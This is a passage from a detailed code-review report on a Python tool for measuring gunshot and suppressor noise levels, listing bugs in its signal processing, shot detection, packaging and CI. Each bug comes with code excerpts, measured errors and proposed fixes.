        data_mono = data.mean(axis=1)   # WavLoader.py:117  (and WavLoader.py:85 in load_wav_chunk)
```

**Failure:** Every read path (main.py:778 and the four load_wav_chunk calls at main.py:409, 460, 494, 512) passes mono=True, which averages channels. Case 1 — the extremely common field setup of one measurement mic patched into input 1 of a two-channel recorder: the WAV has 2 channels, one of them silence, mean([p, 0]) = p/2, so every reported level — Lpeak_Z, LAE, all band levels, the calibration check itself — is understated by exactly 20*log10(0.5) = 6.02 dB. A 158 dB shot is reported as 152 dB, and there is no warning because nothing inspects per-channel content. Case 2 — the MIL-STD-1474E style setup of two mics at different positions (e.g. shooter's ear and 1 m left): the two impulses arrive at different times and are largely uncorrelated, so averaging produces a pressure history that corresponds to no physical measurement point at all, and both the peak and the B-duration are wrong. Calibration is inherently per-transducer, but Calibration has a single scalar Pa_per_FS, so even correct per-channel handling is not expressible today.

**Fix:** Add a --channel / UI channel selector. On load, report n_channels and per-channel peak and RMS. For a multi-channel file with no explicit selection, either error out or (safer default) analyze channel 0 with a loud warning naming the channel - never average. Warn when any channel's RMS is >~40 dB below another's (dead/unpatched channel). Longer term extend Calibration to a per-channel mapping so a 2-mic array can be calibrated independently; a mixdown, if ever offered, must be opt-in and labelled non-physical.


## Medium (59)


### Impulse time weighting has an energy gain of 42.9x (16.3 dB), so per-band SEL computed from it is ~+15 dB wrong

`bands.py:251` · Bands & Spectral · IEC 61672-1:2013 Impulse weighting is a maximum-reading detector; SEL/LE (clause 3.10) is the time integral of squared pressure and requires a unity-gain integration.

```python
alpha_attack = 1.0 - np.exp(-dt / TIME_CONSTANT_IMPULSE_ATTACK)
            alpha_decay = 1.0 - np.exp(-dt / TIME_CONSTANT_IMPULSE_DECAY)
...
                alpha = np.where(rising, alpha_attack, alpha_decay)
                state = alpha * instant + (1.0 - alpha) * state
```

**Failure:** The symmetric Fast/Slow detector is an exponential average with unity DC gain, so integrating its output recovers the true energy. The asymmetric Impulse detector is not: an impulse charges the state to E/tau_attack and then discharges with tau_decay, so the time integral of its output is E * tau_decay/tau_attack = 1.5/0.035 = 42.9 (+16.33 dB). compute_band_exposure() integrates exactly that output. Verified with the shipped code (fs=48000, a 1 ms 1 kHz 200 Pa burst, true broadband SEL = 106.99 dB): sum of per-band SEL is 107.11 dB with 'fast', 106.89 dB with 'slow' and 107.12 dB with 'none' -- but 122.28 dB with 'impulse' (+15.29 dB), and the 1 kHz band alone reads 115.90 dB instead of 100.64 dB. Reachable from the public API and from bands.py's own CLI (`python bands.py shot.wav --weighting impulse`), whose printed Max/Mean dB table is likewise inflated.

**Fix:** Carry the weighting through (analyze() already returns results['time_weighting'] at bands.py:329) and have compute_band_exposure/compute_leq accept the results dict, raising if time_weighting is 'impulse' and warning if it is 'fast'/'slow'. Energy quantities should be computed from time_weighting='none' (mean-square per hop, bands.py:240-246), which I measured accurate to +0.13 dB. Keep 'impulse' for maximum-reading use only.


### Band edges are base-2 and centres are the rounded ISO 266 labels, so adjacent bands leave 1.59% gaps and 0.79% overlaps instead of tiling

`bands.py:75` · Bands & Spectral · IEC 61260-1:2014 clauses 5.2/5.3 (octave ratio G = 10^(3/10) preferred; exact midband and band-edge frequencies); ISO 266:1997 (nominal frequencies are designations, not design values).

```python
# Band edge ratio: 2^(1/(2*fraction))
    ratio = 2.0 ** (1.0 / (2.0 * fraction))
    f_low = fc / ratio
    f_high = fc * ratio
```

**Failure:** IEC 61260-1 prefers the base-ten system G = 10^(3/10), exact midband fm = 1000*G^(x/3) and edges fm*G^(-+1/6); the ISO 266 numbers are NOMINAL labels for display only. bands.py uses the nominal numbers as design centres AND base-2 edges. Measured errors: nominal 12500 vs exact 12589.254 = -0.71%; edge errors up to -0.75% (12500 band f_low 11136.23 vs IEC 11220.19). Worse, the nominal series is not geometric so the bands do not tile: measured GAPS of +1.59% at 125->160 Hz (upper edge 140.31, next lower edge 142.54), 1250->1600 Hz (1403.08 / 1425.44) and 12500->16000 Hz (14030.78 / 14254.38), and OVERLAPS of -0.79% at 4000->5000, 8000->10000 and 16000->20000 Hz. Energy sitting in a gap (e.g. a 141.4 Hz suppressor resonance) is reported correctly by neither the 125 Hz nor the 160 Hz band; energy in an overlap is counted twice by analyze()['overall_level_dB']. Combined with the finite Butterworth skirts, sum-of-bands != broadband: measured on white noise, sum of band powers is 93.20 dB vs a true in-span level of 93.70 dB, a -0.50 dB reconstruction deficit at 48, 96 and 192 kHz alike.

**Fix:** Keep ISO_CENTER_FREQUENCIES/EXTENDED_CENTER_FREQUENCIES as label-only arrays and add a parallel exact array fm = 1000.0 * G**(x/3.0) with G = 10.0**0.3 used for design; change compute_band_edges to ratio = G**(1.0/(2.0*fraction)). Report headings and plot ticks keep the nominal numbers. Add a test asserting f_high[i] == f_low[i+1] to 1e-9 relative. Do not claim a -0.5 dB fix; the measured sum-of-bands residual is +0.13 dB and is dominated by Butterworth ENBW excess, which should be documented rather than removed.


### Causal sosfilt gives 42 ms of group delay in the 20 Hz band vs 0.25 ms at 16 kHz, so the 1/3-octave heatmap is time-skewed against the shot markers drawn on it

`bands.py:206` · Bands & Spectral

```python
for i, filt in enumerate(self.filters):
            band_signals[i] = sosfilt(filt.sos, x)
```

**Failure:** sosfilt is a causal one-pass IIR, so each band adds its own group delay ~ order/(pi*BW). Measured with the shipped analyzer at fs=48000 on a single-sample impulse, the peak of the band response arrives +42.33 ms later in the 20 Hz band, +38.21 ms at 31.5 Hz, +36.98 ms at 63 Hz, +31.88 ms at 125 Hz, +15.94 ms at 250 Hz, +3.98 ms at 1 kHz and +0.25 ms at 16 kHz. plots.py:407-410 then draws the broadband detector's shot markers (ax.axvline(shot.time_s, ...)) on top of this heatmap, so for every shot the low-frequency rows sit up to 42 ms to the RIGHT of the marker -- an operator reading blast/tail structure off the heatmap is reading a 42 ms artefact. It also corrupts per-shot windows: with pre_shot_ms=50 and post_shot_ms=200 (main.py:88-89), the 20 Hz band's response to a shot at the window centre is displaced most of the way to the window edge, so its energy is partly truncated out of compute_band_exposure.

**Fix:** Do not simply swap in sosfiltfilt with half the order - filtfilt squares the magnitude response, so an order-2 filtfilt is -6 dB at the designed edges, not -3 dB. Either (a) keep sosfilt and subtract each band's measured group delay at fm when building time_axis (bands.py:292), which is cheap and preserves the magnitude design, or (b) move to sosfiltfilt and re-solve the edge frequencies so |H|^2 is -3 dB at the band edges, noting the doubled memory cost. Add a test asserting all bands peak within one hop of an impulse.


### Chunked band analysis resets both the bandpass filters and the exponential detector at every 120 s boundary, producing a 280 ms band-level hole

`main.py:656` · Bands & Spectral

```python
band_res = analyzer.analyze(pressure_chunk, time_weighting='fast', hop_ms=10.0)
```

**Failure:** bands.py:206 calls sosfilt with no zi, and bands.py:280 runs the exponential detector from zero initial state; BandFilter.zi and BandFilter.reset() (bands.py:125-130) are defined but never called anywhere in the repository. main.py's chunked path re-enters analyze() per 120 s chunk with no state carried across. Verified with the shipped code (fs=48000, steady 1 kHz tone at 94.00 dB, 'fast', hop_ms=10): the first eight frames of a chunk read 80.7, 84.8, 86.7, 88.0, 88.9, 89.6, 90.1, 90.6 dB, and it takes 28 frames (280 ms) to come within 0.5 dB of the 94 dB steady state. So on any recording longer than 120 s -- a routine shot string -- every 120 s boundary carries a 280 ms window in which band levels are under-reported by up to 13.3 dB. A shot landing in that window has its per-band levels understated with no indication in the output.

**Fix:** Give ThirdOctaveAnalyzer streaming state: per-band zi initialised as sosfilt_zi(sos)*x[0], the exponential-detector state, and an explicit analyzer.reset() called once per file in _analyze_file_chunked rather than implicitly per chunk. Thread zi through the sosfilt calls at bands.py:206 and 280. Cheaper interim fix: overlap chunks by 5*tau (625 ms for Fast) and discard the warm-up frames before concatenating at main.py:657-658.


### Fixed 2048-sample window is 42.7 ms at 48 kHz and 10.7 ms at 192 kHz, both far longer than a muzzle blast, so the same shot yields different spectrograms at different sample rates

`main.py:93` · Bands & Spectral

```python
nperseg: int = 2048
```

**Failure:** A suppressed muzzle blast is roughly 1-3 ms. nperseg is a sample count, not a duration, so the analysis window silently changes meaning with the recording's sample rate: 42.67 ms at 48 kHz, 21.33 ms at 96 kHz, 10.67 ms at 192 kHz -- a 4x difference in time resolution and a 4x difference in frequency resolution (23.4 / 46.9 / 93.75 Hz) across recordings a tester would expect to compare directly. Combined with the missing ENBW correction, the same physical shot recorded at 48 kHz and at 192 kHz produces spectrogram values differing by about 6 dB. Measured window-length sensitivity on one 1 ms burst: 121.43 dB at nperseg=256 down to 91.79 dB at nperseg=8192.

**Fix:** Add `stft_window_ms: float` to AnalysisConfig and derive nperseg = next_pow2(stft_window_ms * sr / 1000) at each call site so the time/frequency tradeoff is sample-rate independent. Expose it in the CLI and GUI in milliseconds instead of samples (this also removes the nperseg=512 crash surface). Record the resolved nperseg, window duration and frequency resolution in metrics.json via save_json_metadata (main.py:365). Note this only makes the figure self-consistent - it does not remove the underlying scaling error, which needs stft-spectrogram-not-a-level fixed too.


### 1/3-octave heatmap y-axis labels are offset by half a band: the tick labelled fc[i] falls exactly on the boundary between band i and band i+1

`plots.py:396` · Bands & Spectral

```python
band_indices = np.arange(n_bands + 1) - 0.5

    pcm = ax.pcolormesh(
        time_s,
        band_indices[:-1],
        band_levels_dB,
```

**Failure:** band_indices is built as n_bands+1 CELL EDGES (-0.5 .. n_bands-0.5), which is correct, but [:-1] truncates it to n_bands values. Because len(y) then equals band_levels_dB.shape[0], shading='auto' resolves to 'nearest' and matplotlib treats those values as cell CENTRES. Verified by inspecting the resolved QuadMesh coordinates for n_bands=5: the cell edges become [-1, 0, 1, 2, 3, 4], so band i is drawn spanning (i-1, i). plots.py:415-417 then sets ticks at the integers 0..n_bands-1 labelled center_frequencies[i], so every tick sits exactly on a cell boundary. A reader tracing the tick labelled '1000' into the plot lands on the boundary between the 1000 Hz and 1250 Hz rows and will attribute band energy to the wrong 1/3-octave -- a full band, i.e. a 23% frequency error, in the primary suppressor-spectrum figure (rendered by both main.py:671 and main.py:931).

**Fix:** Pass the full edge array and force flat shading: `ax.pcolormesh(time_s, band_indices, band_levels_dB, shading='flat', ...)`. Note time_s must then also have n_frames+1 entries or matplotlib will complain - simplest is to build a time-edge array too (time_s extended by one hop) rather than relying on 'auto'. Add a visual regression test with a single active band.


### Lossy compressed formats are accepted as measurement input with no warning

`FileSelector.py:30` · Shot Detection & Sampling

```python
AUDIO_EXTS = [
    ".mp3", ".wav", ".flac", ".aac", ".m4a", ".ogg", ".opus", ".wma", ".aiff", ".alac",
]
```

**Failure:** main.py:1126-1127 only warns when the extension is NOT in AUDIO_EXTS, so .mp3/.aac/.m4a/.ogg/.opus/.wma pass through with zero comment and all metrics are computed and reported as if they were measurements. Perceptual codecs are specifically destructive for impulses: they introduce pre-echo (spreading energy backwards across the transform block, which corrupts rise_time_us and the pre-trigger baseline), they low-pass aggressively (typically 15-16 kHz at 128 kbps, removing the blast content above that), and they do not preserve absolute amplitude, which invalidates the entire Pa_per_FS calibration chain that the Lpeak/LAE numbers rest on. A customer who hands over a phone-recorded .m4a receives a defensible-looking Lpeak in dB SPL that is physically meaningless.

**Fix:** Restrict analysis input to lossless containers - .wav/.flac/.aiff/.w64/.rf64/.caf - and reject the rest with an explanatory error at the top of analyze_file (not just a print at main.py:1126, which the GUI never runs). Drop .mp3/.aac/.m4a/.ogg/.opus/.wma/.alac from FileSelector.AUDIO_EXTS for the analysis picker while keeping them for the video-extraction picker. If a lossy source is ever permitted for triage, stamp lossy_source: true in analysis_metadata.json and print a NOT-FOR-MEASUREMENT banner on every plot and in the CSV header.


### No sample-rate adequacy validation: rise time is quantized to one sample yet reported to 0.1 us, and the 1/3-octave band set silently changes with sample rate

`metrics.py:257` · Shot Detection & Sampling · ANSI S12.7 / MIL-STD-1474E; IEC 61260-1; ISO 266

```python
rise_samples = max(0, i_90 - i_10)
    return rise_samples / sample_rate * 1e6  # microseconds
```

**Failure:** Rise time can only take values that are integer multiples of 1/fs: 22.68 us at 44.1 kHz, 20.83 us at 48 kHz, 10.42 us at 96 kHz, 5.21 us at 192 kHz — against the module's own documented range of "1-50 us for muzzle blast" (metrics.py:223). So at 48 kHz the only possible reported rise times for a real muzzle blast are 0.0, 20.8 and 41.7 us, and main.py:357 writes `round(m.rise_time_us, 1)` into the CSV, presenting a 20.83 us quantum as a 0.1 us-resolution measurement. Separately, ThirdOctaveAnalyzer's Nyquist guard (bands.py:152 `self.max_freq = self.sample_rate / 2.0 * 0.9` and bands.py:169 `if f_high >= self.sample_rate / 2.0: continue`) silently changes the band set with sample rate — verified 30 bands (20-16000 Hz) at 44.1 kHz, 31 (20-20000) at 48 kHz, 34 (20-40000) at 96 kHz, 37 (20-80000) at 192 kHz. compute_band_exposure therefore sums a different number of bands per file, so the same suppressor recorded on two rigs is not comparable, and neither the band count nor the effective upper frequency is written into analysis_metadata.json.

**Fix:** (1) Warn at load when sample_rate < 96000 and state in the report that rise time and B-duration are unresolved; report rise_time_us with an explicit +/- (1e6/fs) us uncertainty column instead of rounding to 0.1 (main.py:357). (2) Promote band metadata from the per-shot blocks to a top-level analysis_metadata.json field - n_bands, band_center_frequencies, effective_upper_Hz - so it is present even when compute_bands is off or no shots were found, and refuse to aggregate or compare results whose band sets differ.


### Extraction windows truncated at file boundaries and at 120 s chunk boundaries are never recorded, so SEL/LAE is silently under-reported

`shot_detect.py:284` · Shot Detection & Sampling · MIL-STD-1474E energy-integration window

```python
# Compute window
        window_start = max(0, refined_idx - pre_samples)
        window_end = min(n, refined_idx + post_samples)
```

**Failure:** compute_exposure_level (metrics.py:387-394) integrates p^2 over whatever window it is handed, so a short window means a low LAE with no indication. Verified: a shot at t=10 ms gets a 210 ms window instead of 250 ms; shortening the post-window to 100/50/20 ms costs -0.07/-0.40/-1.28 dB of LZE on a modest 60 ms decay (much more in a reverberant space). This is not just an end-of-file edge case — in _analyze_file_chunked the 120 s chunks are processed independently with NO overlap, so any shot in the last 200 ms of a chunk is clamped by `min(n, ...)` against the chunk end (the truncated event is then re-loaded with exactly that truncated frame count at main.py:459-460), and a shot in the first 50 ms of a chunk loses its pre-trigger. With CHUNK_DURATION_S=120 there is one such boundary every two minutes of a range-day recording. Because the chunked path only triggers above MAX_DURATION_FULL_LOAD_S=600, the SAME shot in the SAME file yields a different LAE depending only on whether the file is longer than 10 minutes.

**Fix:** Add truncated_pre/truncated_post/actual_window_ms to ShotEvent, propagate them to the CSV and JSON, and flag (rather than silently drop) truncated shots in compute_aggregate_metrics. For the chunked path the cheaper correct fix than overlapping chunks is to stop clamping against the chunk: convert window bounds to absolute file coordinates and clamp against total_frames, since main.py:459 re-reads each window from disk anyway and can read across a chunk boundary freely.


### Detection runs on raw broadband pressure with no high-pass and no impulsiveness test, so wind and handling noise are reported as shots

`shot_detect.py:252` · Shot Detection & Sampling

```python
# Compute envelope
    envelope, indices = compute_envelope(x, envelope_window, envelope_hop)
```

**Failure:** compute_envelope is a plain RMS of the unfiltered pressure, and the only acceptance test is `above = envelope > threshold` (shot_detect.py:135). Verified: an 8 Hz wind pop of 40 Pa peak (125.7 dB SPL — routine for an unscreened 1/2" mic in an 8 m/s gust, and comfortably above the default 120 dB threshold) is detected as one shot and reported with Lpeak_Z=125.7 dB, LAE=17.7 dB, rise_time=19562 us and kurtosis=-1.31. Excess kurtosis of -1.31 and a 19.6 ms rise time identify it unambiguously as non-impulsive, yet nothing gates on either, so it lands in metrics_summary.csv and drags the aggregate LAE/LAFmax means. The same applies to bolt-cycling and mic-stand knocks.

**Fix:** Detect on a band-limited copy: build one scipy.signal.butter SOS (200 Hz - 20 kHz, or 200 Hz - 0.45*fs when fs is low) and run compute_envelope on sosfiltfilt of it, leaving the metrics path on the unfiltered pressure so levels are unchanged. Then add post-detection validity gates on the extraction window - rise_time_us < 500 and crest_factor_dB > 15 - and mark failures as rejected candidates with a reason rather than discarding them or letting them into the aggregate. Do not gate on kurtosis alone without first calibrating a threshold on real data.


### Nothing separates the ballistic crack from the muzzle blast, so a supersonic round's reported 'suppressed' peak may be measuring the projectile, not the suppressor

`shot_detect.py:274` · Shot Detection & Sampling · MIL-STD-1474E impulse noise / suppressor evaluation practice

```python
# Refine peaks and create events
    shots = []
    for i, approx_idx in enumerate(peak_indices):
        # Refine to exact peak
        refined_idx = refine_peak_location(x, approx_idx)
```

**Failure:** A supersonic round produces two distinct acoustic events at any off-axis measurement position: the Mach-cone ballistic crack and the muzzle blast, typically 1-30 ms apart. The code treats a shot as exactly one peak. Two failure modes were reproduced. (1) When both events fall inside one above-threshold region, argmax picks whichever is larger and the 250 ms window integrates BOTH into a single LAE — so the reported 'suppressed shot' energy includes the crack, which no suppressor can reduce, and a suppressor tested with supersonic ammunition scores worse than one tested with subsonic ammunition for reasons that have nothing to do with the suppressor. (2) When they form separate regions, the FIRST one wins the refractory slot regardless of level: verified with a 300 Pa precursor 100 ms before a 3000 Pa blast, the reported ShotEvent.peak_dB_SPL is 143.8 dB against a true 163.5 dB — 19.7 dB low. Nothing in the JSON, CSV or plots distinguishes the two events.

**Fix:** Do not attempt N-wave classification as a first step - it needs a validated model and the shipped GUI path runs at 44.1 kHz where sub-100 us structure is unresolvable. Ship the cheap half first: run scipy.signal.find_peaks with a prominence threshold inside each extraction window, and when more than one qualified peak is present, emit multi_event=true, the peak times/levels and their separation into the CSV and JSON so no number is quoted blind. Add crack/blast classification and a blast-only figure of merit only for inputs at >=96 kHz.


### The threshold is labelled 'dB SPL' everywhere but is compared against a 1 ms RMS envelope ~10.7 dB below Lpeak, biasing suppressed-vs-unsuppressed comparisons

`shot_detect.py:213` · Shot Detection & Sampling

```python
threshold_dB: Absolute detection threshold in dB SPL (for RMS envelope).
                      Typical gunshots: 140-170 dB peak, so 100-120 dB envelope.
```

**Failure:** main.py:809 prints "Detection threshold: 120 dB SPL" and ui/renderer/index.html:151 labels the field "Threshold (dB SPL)" with no mention of RMS. Verified offset for a synthetic muzzle blast: Lpeak 164.3 dB but max 1 ms-RMS envelope 153.6 dB, i.e. -10.7 dB, and the offset depends on the temporal spread of the blast. Two concrete consequences. (a) An operator who knows the shots peak at 165 dB and sets the threshold to 160 to be safe detects ZERO shots. (b) Worse for this product: a suppressor stretches the blast in time, so the peak-to-1 ms-RMS offset differs between the suppressed and unsuppressed conditions being compared. With the 120 dB default and a suppressed 130 dB-peak round, the envelope lands near 119-122 dB and straddles the threshold — the quieter shots of the string fail to detect while the loudest ones pass, so the suppressed mean is biased HIGH and the measured suppression is reported SMALLER than it actually is. Nothing warns, because min_shots is never passed (shot_detect.py:204) and no expected round count is collected anywhere.

**Fix:** Rename the parameter and every label to 'Envelope threshold, dB SPL (1 ms RMS)' in shot_detect.py, main.py's argparse help, the main.py:809 print and index.html:151. Before the run, show the file's measured Lpeak and the resulting margin in the UI (analyze_file already computes peak_dB at main.py:792-793 - send it over the WebSocket). Add an expected-round-count field wired to the existing min_shots so a count mismatch fails loudly. Making threshold_relative_dB the default detection mode is a larger change and should be offered as a selectable mode, not silently swapped in.


### CI only runs on version tags and only builds binaries — no tests, no lint, no install check, no build on push or PR

`.github/workflows/build.yml:3` · Engineering Quality

```python
on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
```

**Failure:** The workflow has exactly two jobs (build-macos, build-windows), each with the steps checkout / setup-python / pip install / generate icons / pyinstaller / zip / upload. There is no `pytest` step, no `ruff check` step, and no `pip install .` step. Combined with the tag-only trigger, a commit that breaks main.py — a syntax error, a bad import, the invalid build-backend in pyproject.toml — is never exercised by CI until someone cuts a release tag, at which point the failure surfaces in the release pipeline rather than on the PR that caused it. The invalid `setuptools.backends._legacy` backend has survived in the repo precisely because nothing ever runs `pip install .`.

**Fix:** Add `pull_request:` and `push: branches: [main]` triggers plus a `test` job (pip install -e .[dev,video]; ruff check .; pytest -q) that the two build jobs depend on via `needs: test`. Add a `pip install .` + entry-point smoke step — that one step alone catches invalid-build-backend, missing-cli-main and py-modules-missing-app. A 3.10-3.14 matrix is premature until the classifier claims are backed.


### README documents a Node.js UI that the shipped app does not use, and both build scripts npm-install dependencies that are never bundled

`README.md:146` · Engineering Quality

```python
SASA includes a browser-based interface powered by a Node.js server that bridges to the Python backend.
```

**Failure:** README's 'Web UI' section tells the user to `cd ui && npm install` and `node ui/server.js` on port 3847. sasa.spec's own docstring (lines 6-7) states the opposite: 'Entry point: app.py — a pure-Python HTTP + WebSocket server that serves the web UI and bridges to the analysis backend. No Node.js required.' app.py:987 binds the same port 3847, so if a user follows the README and also opens the app, the second server dies with EADDRINUSE. sasa.spec's datas (line 31) bundles only `('ui/renderer', 'ui/renderer')` — server.js, bridge/python-bridge.js and package.json are not in the frozen app at all. Meanwhile build_macos.sh:51 runs `cd ui && npm install --production && cd ..` and build_windows.bat:50-52 does the same, downloading express/multer/ws into ui/node_modules on every build for a bundle that never contains them — and build_macos.sh has `set -euo pipefail` (line 13), so an npm registry hiccup aborts the entire Python build. The two servers also implement config mapping independently (app.py:781-801 vs python-bridge.js:37-85), so a flag added to one silently does not exist in the other; neither passes `--dtype` at all.

**Fix:** Delete ui/server.js, ui/bridge/, ui/package.json and ui/package-lock.json; remove the npm blocks from build_macos.sh:47-56 and build_windows.bat:45-56; rewrite README.md:144-154 to describe launching app.py. That single change also retires the multer dependency and the divergent config mapping. If the Node path must survive as a dev tool, at minimum move the npm install behind an opt-in flag so it cannot abort the release build.


### Both UI-to-analysis bridges use truthiness guards, so a user-entered 0 silently reverts to the built-in default

`app.py:791` · Engineering Quality

```python
if config.get('thresholdDb'):
                ac_kwargs['detection_threshold_dB'] = float(config['thresholdDb'])
```

**Failure:** The same pattern repeats at app.py:781 (`paPerFS`), 783 (`sensitivityMv`), 785 (`vPerFS`), 793 (`refractoryMs`), 795 (`preMs`), 801 (`nperseg`), and identically in ui/bridge/python-bridge.js:37, 51, 54, 57, 60, 65. Concrete: an operator testing a very quiet suppressed .22 sets the detection threshold to 0 dB in the UI to catch everything. `config.get('thresholdDb')` is `0` -> falsy -> the branch is skipped -> AnalysisConfig's default `detection_threshold_dB: float = 120.0` (main.py:87) applies. The tool detects zero shots and reports 'No shots detected', while the UI still displays 0 as the active threshold. Same failure for `refractoryMs: 0` (user wants no refractory gate, gets 200 ms and loses every shot in a fast string), and `preMs: 0`. The empty-string case is also conflated with the zero case, so there is no way to distinguish 'unset' from 'explicitly zero'.

**Fix:** Fix all three layers, not two: change ui/renderer/app.js:170-174 from `|| default` to an explicit `Number.isFinite(v) ? v : default` on the parsed value, change app.py's guards to `if config.get(k) not in (None, ''):`, and change python-bridge.js to `!== undefined && !== null && !== ''`. Add a test posting {thresholdDb: 0, refractoryMs: 0} and asserting the constructed AnalysisConfig carries 0.0 for both.


### main.py unconditionally imports FileSelector, which raises RuntimeError at import time when tkinter is missing — killing the entire package, GUI included

`main.py:42` · Engineering Quality

```python
from FileSelector import choose_media_file, VIDEO_EXTS, AUDIO_EXTS
```

**Failure:** FileSelector.py lines 19-27 wrap `import tkinter` in a try and then `raise RuntimeError("tkinter is required but not available...")`. Because main.py imports it at module scope (unlike the ExtractAudio import three lines below, which IS guarded by try/except ImportError at lines 43-47), any Tk-less interpreter — Linux CI containers, `python.org` builds where the user unchecked tcl/tk, most conda envs, Alpine/Debian without python3-tk — makes `import main` fail outright. That in turn kills app.py:265 `from main import analyze_file, AnalysisConfig`, so the browser UI shows 'Failed to import analysis modules: ...' and the product is 100% non-functional on a machine that never needed a file dialog. It also makes headless batch analysis impossible, which is exactly what a test-range workflow wants.

**Fix:** Move `import tkinter` inside choose_media_file() and move AUDIO_EXTS/VIDEO_EXTS to a dependency-free location (they are pure string data). Separately, widen app.py:772 to `except Exception` so any import-time failure surfaces in the UI instead of killing the handler thread silently.


### analysis_metadata.json carries no software version, no config, no input-file hash — results are untraceable

`main.py:153` · Engineering Quality

```python
def to_dict(self) -> Dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'input_file': str(self.input_file),
            'output_dir': str(self.output_dir),
            'calibration': {
                'Pa_per_FS': self.calibration.Pa_per_FS,
                'description': self.calibration.description,
                'is_calibrated': self.calibration.is_calibrated(),
            },
            'sample_rate': self.sample_rate,
            'duration_s': round(self.duration_s, 3),
            'n_shots': self.n_shots,
            'aggregate': self.aggregate.to_dict(),
            'timestamp': self.timestamp,
        }
```

**Failure:** AnalysisResult carries a `config: AnalysisConfig` field (main.py:150) but to_dict() drops it entirely, and no version string exists anywhere in the codebase (`grep -rn '__version__' *.py` -> nothing; the only '1.0.0' literals are in pyproject.toml:7 and sasa.spec:156-157, neither reachable at runtime). Concrete: two report JSONs from the same WAV show Lpeak 158.2 and 161.4 dB. Nothing in either file records which detection_threshold_dB, refractory_ms, pre/post window, nperseg, or which build produced them — so the discrepancy cannot be adjudicated, and a customer challenging a suppressor result cannot be answered. There is no changelog either, so 'which version was this?' has no answer even outside the file.

**Fix:** Add _version.py read by both pyproject (dynamic version) and sasa.spec, and extend main.py:153 to_dict() with sasa_version, git_commit, python/numpy/scipy/soundfile versions, platform, input_sha256, and sf.info(...).subtype. Do NOT claim config is missing — instead fold the existing config.json content into analysis_metadata.json via dataclasses.asdict(self.config) so one file is self-contained, and add the clipping counters from the finding above.


### project.scripts points at `main:cli_main`, which does not exist in main.py

`pyproject.toml:57` · Engineering Quality

```python
sasa = "main:cli_main"
```

**Failure:** `grep -rn "cli_main" *.py` across the entire repo returns zero hits. main.py defines `def main() -> int:` at line 1010 and dispatches via `if __name__ == "__main__": raise SystemExit(main())` at lines 1152-1153. Once the build-backend is fixed and the package installs, running `sasa recording.wav` produces the generated console-script stub calling `from main import cli_main` -> `ImportError: cannot import name 'cli_main' from 'main'`. The advertised CLI entry point is dead on arrival.

**Fix:** Add `def cli_main() -> None: raise SystemExit(main())` next to main.py:1152 and keep pyproject.toml:57 pointing at main:cli_main, so the public entry-point name is decoupled from the internal function. Latent until invalid-build-backend is fixed — fix both in the same change and cover with a `sasa --help` smoke test.


### `app` is absent from [tool.setuptools].py-modules, so the installed package cannot start the desktop/web app

`pyproject.toml:60` · Engineering Quality

```python
py-modules = [
    "main",
    "calibration",
    "weighting",
    "shot_detect",
    "bands",
    "metrics",
    "plots",
    "STFT",
    "WavLoader",
    "WaveformPlot",
    "SignalGenerator",
    "ExtractAudio",
    "FileSelector",
]
```

**Failure:** The list enumerates 13 modules. The repo has 14 top-level .py files; `app.py` — the HTTP+WebSocket server that is the PyInstaller entry point (sasa.spec line 97: `['app.py']`) and the only way an end user reaches the GUI — is not listed. After `pip install .`, `python -m app` or `import app` raises ModuleNotFoundError, so the installed wheel ships the whole analysis library but no way to launch the product. Separately, `ui/renderer/` (index.html, app.js, styles.css) is not declared as package data either, so even adding `app` to the list would leave the installed server unable to serve its own front end.

**Fix:** Add "app" to py-modules and declare ui/renderer via [tool.setuptools.package-data] (or drop the wheel path entirely and document PyInstaller as the only supported install). Add the two-line os.listdir-vs-py-modules drift check to tests.


### pyproject and README both assert a proprietary license but no LICENSE file exists in the repository

`pyproject.toml:10` · Engineering Quality

```python
license = {text = "Proprietary — Copyright © 2024-2026 Ridgeback Defense"}
```

**Failure:** `ls LICENSE*` in the repo root returns 'no matches found' and `git ls-files` contains no LICENSE, COPYING, or NOTICE. README.md:874 says only 'Copyright © 2024–2026 Ridgeback Defense. All rights reserved.' with no terms, and README.md:10 renders a 'license-proprietary' shield. ui/package.json:9 separately declares `"license": "PROPRIETARY"`, which is not a valid SPDX identifier and makes npm emit a warning. Consequence: the built wheel and sdist carry a license classifier with no license text; GitHub shows no license; a customer's legal review has nothing to review; and there is no stated position on the redistribution of the bundled GPL/LGPL-adjacent components (ffmpeg via imageio-ffmpeg is a real question here — an ffmpeg binary is shipped inside the .app per sasa.spec:54).

**Fix:** Add a LICENSE file with the actual terms and reference it from pyproject. Change ui/package.json to "license": "UNLICENSED" plus "private": true. Add THIRD-PARTY-NOTICES covering numpy/scipy/matplotlib/plotly/soundfile/libsndfile and — most importantly — the bundled ffmpeg build from sasa.spec:54, whose license (LGPL vs GPL depending on the imageio-ffmpeg build) determines what the proprietary bundle may redistribute.


### compute_spectral_centroid Hann-windows the entire extraction window, attenuating the shock front (where the HF content is) by 9.2 dB relative to the mid-window tail; the centroid then depends on the pre/post window split

`metrics.py:331` · Acoustic Metrics · IEC 61260-1:2014 (band-based spectral description of transients)

```python
# Apply Hann window to reduce spectral leakage
    window = np.hanning(N)
    X = np.abs(np.fft.rfft(pressure_Pa * window))
```

**Failure:** The shot onset sits at pre_shot_ms into a (pre+post) ms window, so with the default 50/200 ms split the Hann taper has value 0.5·(1-cos(2π·0.2)) = 0.345 at the shock front, i.e. the highest-frequency, highest-amplitude part of the event is attenuated 9.2 dB while the low-frequency reverberant tail near the window centre is passed at unity. Measured at 96 kHz on one identical shot, changing ONLY the pre/post split: 50/200 -> 504.3 Hz; 25/200 -> 470.4 Hz; 100/200 -> 524.6 Hz; 50/100 -> 515.2 Hz; 50/500 -> 505.6 Hz; 125/125 -> 536.4 Hz. That is a 66 Hz (14%) swing driven purely by where in the window the analyst happened to place the trigger. All six values are also grossly biased low against a shot-scoped measurement of the same event (2645 Hz), because the whole-window transform is dominated by the LF tail that the taper preserves. Spectral centroid is the metric README.md:54 offers for 'distinguishing weapon types and suppressor effects', so the bias is directly in the product's stated use case.

**Fix:** Same fix as the scoping finding — extract the -20 dB envelope segment first, then apply the Hann taper to that segment (zero-pad after tapering if more frequency resolution is wanted). Track this as one work item with kurtosis-crest-centroid-scoped-to-whole-window rather than two. The alternative of deriving the centroid from ThirdOctaveAnalyzer's band levels is also viable and traceable to IEC 61260-1, but band-limited to the 1/3-octave grid; prefer the segment-scoped FFT and report the segment bounds.


### Rise time is quantised to whole samples with no interpolation and no warning that the sample rate cannot resolve muzzle-blast rise times

